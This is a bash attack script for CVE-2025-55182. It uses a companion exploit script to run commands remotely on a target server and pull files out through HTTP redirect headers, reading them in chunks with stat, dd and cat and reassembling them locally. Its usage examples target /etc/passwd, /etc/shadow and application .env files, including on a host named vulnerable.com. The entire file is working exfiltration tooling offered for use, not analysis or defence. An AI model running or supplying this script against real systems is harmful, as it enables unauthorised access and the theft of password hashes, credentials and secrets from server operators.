#!/bin/bash
#
# exfil-file.sh - Chunked file exfiltration for CVE-2025-55182
#
# Automatically chunks large files and reassembles them locally.
# Uses exploit-redirect.sh for each chunk (HTTP 303 header exfil).
#
# Usage: ./exfil-file.sh <target_url> <remote_file_path> [output_file]
#
# Example:
#   ./exfil-file.sh http://localhost:3443 /etc/passwd
#   ./exfil-file.sh http://localhost:3443 /var/log/nginx/access.log ./access.log
#

set -e

# Configuration
CHUNK_SIZE=6000      # ~6KB chunks (safe for most HTTP header limits)
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
EXPLOIT_SCRIPT="$SCRIPT_DIR/exploit-redirect.sh"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

usage() {
    echo "Usage: $0 <target_url> <remote_file_path> [output_file]"
    echo ""
    echo "Arguments:"
    echo "  target_url        Target URL (e.g., http://localhost:3443)"
    echo "  remote_file_path  Path to file on target server"
    echo "  output_file       Local output file (optional, defaults to stdout)"
    echo ""
    echo "Examples:"
    echo "  $0 http://localhost:3443 /etc/passwd"
    echo "  $0 http://localhost:3443 /etc/shadow ./shadow.txt"
    echo "  $0 https://vulnerable.com /app/.env ./env.txt"
    echo ""
    echo "Options:"
    echo "  CHUNK_SIZE=N      Override chunk size in bytes (default: 6000)"
    exit 1
}

log_info() {
    echo -e "${BLUE}[*]${NC} $1" >&2
}

log_success() {
    echo -e "${GREEN}[+]${NC} $1" >&2
}

log_error() {
    echo -e "${RED}[-]${NC} $1" >&2
}

log_warn() {
    echo -e "${YELLOW}[!]${NC} $1" >&2
}

# Check dependencies
check_deps() {
    if [[ ! -x "$EXPLOIT_SCRIPT" ]]; then
        log_error "exploit-redirect.sh not found or not executable at: $EXPLOIT_SCRIPT"
        exit 1
    fi
}

# Get file size on remote target
get_remote_file_size() {
    local target="$1"
    local filepath="$2"

    log_info "Getting file size for: $filepath"

    # Use stat to get file size (works on Linux, may need adjustment for other OS)
    local result
    result=$("$EXPLOIT_SCRIPT" -q "$target" "stat -c%s '$filepath' 2>/dev/null || stat -f%z '$filepath' 2>/dev/null || echo NOTFOUND" 2>/dev/null)

    if [[ "$result" == "NOTFOUND" ]] || [[ -z "$result" ]]; then
        log_error "File not found or not readable: $filepath"
        return 1
    fi

    # Clean up result (remove whitespace)
    result=$(echo "$result" | tr -d '[:space:]')

    if ! [[ "$result" =~ ^[0-9]+$ ]]; then
        log_error "Could not determine file size. Got: $result"
        return 1
    fi

    echo "$result"
}

# Exfiltrate a single chunk
exfil_chunk() {
    local target="$1"
    local filepath="$2"
    local skip="$3"
    local count="$4"

    # Use dd to extract chunk
    # bs=1 skip=N count=M for byte-level precision
    local cmd="dd if='$filepath' bs=1 skip=$skip count=$count 2>/dev/null"

    "$EXPLOIT_SCRIPT" -q "$target" "$cmd" 2>/dev/null
}

# Main exfiltration logic
exfil_file() {
    local target="$1"
    local filepath="$2"
    local output="$3"

    # Get file size
    local filesize
    filesize=$(get_remote_file_size "$target" "$filepath") || exit 1

    log_success "File size: $filesize bytes"

    # Calculate chunks
    local num_chunks=$(( (filesize + CHUNK_SIZE - 1) / CHUNK_SIZE ))
    log_info "Chunks needed: $num_chunks (${CHUNK_SIZE} bytes each)"

    # Create temp file for assembly
    local tmpfile
    tmpfile=$(mktemp)
    trap "rm -f '$tmpfile'" EXIT

    # Exfiltrate each chunk
    local chunk=0
    local offset=0
    local errors=0

    while [[ $offset -lt $filesize ]]; do
        chunk=$((chunk + 1))
        local remaining=$((filesize - offset))
        local this_chunk_size=$CHUNK_SIZE
        if [[ $remaining -lt $CHUNK_SIZE ]]; then
            this_chunk_size=$remaining
        fi

        log_info "Chunk $chunk/$num_chunks: offset=$offset size=$this_chunk_size"

        local chunk_data
        chunk_data=$(exfil_chunk "$target" "$filepath" "$offset" "$this_chunk_size")

        if [[ -z "$chunk_data" ]] && [[ $this_chunk_size -gt 0 ]]; then
            log_warn "Empty chunk received, retrying..."
            sleep 1
            chunk_data=$(exfil_chunk "$target" "$filepath" "$offset" "$this_chunk_size")

            if [[ -z "$chunk_data" ]]; then
                log_error "Failed to retrieve chunk $chunk after retry"
                errors=$((errors + 1))
            fi
        fi

        # Append to temp file (use printf to preserve exact bytes)
        printf '%s' "$chunk_data" >> "$tmpfile"

        offset=$((offset + this_chunk_size))
    done

    # Output result
    local actual_size
    actual_size=$(wc -c < "$tmpfile" | tr -d ' ')

    if [[ $errors -gt 0 ]]; then
        log_warn "Completed with $errors errors"
    fi

    log_success "Exfiltrated $actual_size bytes (expected: $filesize)"

    if [[ $actual_size -ne $filesize ]]; then
        log_warn "Size mismatch! Some data may be missing."
    fi

    # Output to file or stdout
    if [[ -n "$output" ]]; then
        cp "$tmpfile" "$output"
        log_success "Saved to: $output"
    else
        cat "$tmpfile"
    fi
}

# Quick mode - try to get entire file in one request first
quick_exfil() {
    local target="$1"
    local filepath="$2"
    local output="$3"

    log_info "Attempting quick exfil (single request)..."

    local result
    result=$("$EXPLOIT_SCRIPT" -q "$target" "cat $filepath" 2>/dev/null)

    if [[ -n "$result" ]]; then
        local size=${#result}
        log_success "Quick exfil succeeded: $size bytes"

        if [[ -n "$output" ]]; then
            echo -n "$result" > "$output"
            log_success "Saved to: $output"
        else
            echo -n "$result"
        fi
        return 0
    fi

    return 1
}

# Entry point
main() {
    if [[ $# -lt 2 ]]; then
        usage
    fi

    local target="$1"
    local filepath="$2"
    local output="${3:-}"

    check_deps

    echo -e "${BLUE}=== CVE-2025-55182 File Exfiltration ===${NC}" >&2
    log_info "Target: $target"
    log_info "File: $filepath"
    [[ -n "$output" ]] && log_info "Output: $output"
    echo "" >&2

    # Try quick mode first (for small files)
    if quick_exfil "$target" "$filepath" "$output"; then
        exit 0
    fi

    log_warn "Quick exfil failed or file too large, switching to chunked mode..."
    echo "" >&2

    # Fall back to chunked exfil
    exfil_file "$target" "$filepath" "$output"
}

main "$@"
